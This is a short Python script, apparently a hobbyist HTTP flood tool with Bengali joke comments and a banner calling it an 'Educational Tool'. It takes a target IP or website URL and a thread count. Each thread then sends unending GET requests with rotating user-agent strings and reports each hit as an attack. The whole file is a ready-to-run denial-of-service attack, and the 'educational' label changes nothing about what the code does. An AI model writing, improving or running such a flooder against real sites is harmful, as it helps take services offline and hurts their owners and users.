#!/usr/bin/env python3 মামু কোড চুরি করতে আইছো 
#কোড চুরি করা সম্পূর্ণ নিষেধ ধরা পরলে ৭ টাকা ৭৪ পয়সা  জরিমানা 😁
 #error
import threading
import requests
import random
import time
import os
#error
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
\033[1;92m      ██╗ █████╗  ██████╗██╗  ██╗
\033[1;92m      ██║██╔══██╗██╔════╝██║ ██╔╝
\033[1;92m      ██║███████║██║     █████╔╝ 
\033[1;92m ██   ██║██╔══██║██║     ██╔═██╗ 
\033[1;92m ╚█████╔╝██║  ██║╚██████╗██║  ██╗
\033[1;92m  ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         \033[1;97m Educational Tool 
    """)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]
# error 
def attack(target):
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(target, headers=headers)
            print(f"\033[1;92m[SUCCESS] Sent -> {target} | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("\033[1;91m[FAILED] Host Down or Connection Error")
        time.sleep(0.2)
        #error
def print_box(label):
    print(f"\n\033[1;96m╔═══════════════════════════╗")
    print(f" {label:<32}     ")
    print(f"╚═══════════════════════════╝\033[0m")
#error
def main():
    banner()
    
    print_box("coder by mr shakil jack  ")
    print(" ✅Choose Target Input Method✅")
    print("   1️⃣  IP Address")
    print("   2️⃣  Website URL (http/https)")
    
    choice = input("\n\033[1;96m[>] Enter 1 or 2: \033[0m")

    if choice == "1":
        print_box("🌐 Target IP Address")
        ip = input("\033[1;96m[IP] ➜ \033[0m")
        target = f"http://{ip}"
    elif choice == "2":
        print_box("🌍 Website URL")
        target = input("\033[1;96m[URL] ➜ \033[0m")
    else:
        print("\n\033[1;91m[✘] Invalid Choice! Exiting...\033[0m")
        return

    print_box("🔁 Number of Threads")
    threads = int(input("\033[1;96m[THREADS] ➜ \033[0m"))

    print("\n\033[1;93m[!] Starting Attack...\033[0m\n")
    time.sleep(1)

    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target,))
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)
#error
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[1;91m[✘] Attack Stopped by User.\033[0m")
#==========================ERROR 999+